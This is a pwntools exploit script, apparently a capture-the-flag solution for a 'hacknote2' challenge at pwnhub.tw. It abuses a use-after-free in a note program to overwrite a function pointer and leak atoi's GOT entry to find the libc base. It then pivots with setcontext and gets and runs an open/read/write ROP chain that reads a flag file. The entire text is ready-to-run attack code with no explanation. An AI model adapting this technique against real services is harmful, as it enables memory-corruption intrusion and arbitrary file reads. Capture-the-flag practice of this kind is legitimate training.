#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 20002
r = remote(host,port)

def add_note(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(0x40,"da") #0
add_note(0x40,"da") #1
del_note(0)
del_note(1)
print_note_content = 0x0000000000400abf 
atoi_got = 0x000000000601fe8
add_note(0x10,p64(print_note_content) + p64(atoi_got)) #2
print_note(0)
r.recvuntil("Index :")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x36e80
print hex(libc)
del_note(2)
gets = libc  + 0x6ed80
setcontext = libc + 0x47b75
add_note(0x10,p64(gets))
print_note(0)
buf = 0x00603000-0x300
payload = p64(setcontext).ljust(0x68,"\x00") + p64(buf) 
payload = payload.ljust(0xa0,"\x00") + p64(buf) + p64(gets)
r.sendline(payload)
print_note(0)
context.arch = "amd64"
o = libc + 0xf7030
read = libc + 0xf7250 
write = libc + 0xf72b0
flag = buf + 0x100
pop_rdi = libc + 0x0000000000021102
pop_rsi = libc + 0x00000000000202e8
pop_rdx = libc + 0x0000000000001b92
fd = 3
rop = flat([pop_rdi,flag,pop_rsi,0,o,pop_rdi,fd,pop_rsi,buf-0x400,pop_rdx,0x40,read,pop_rdi,1,pop_rsi,buf-0x400,pop_rdx,0x40,write])
rop = rop.ljust(0x100,"\x00") + "/home/hacknote2/flag\x00"
r.sendline(rop)
r.interactive()
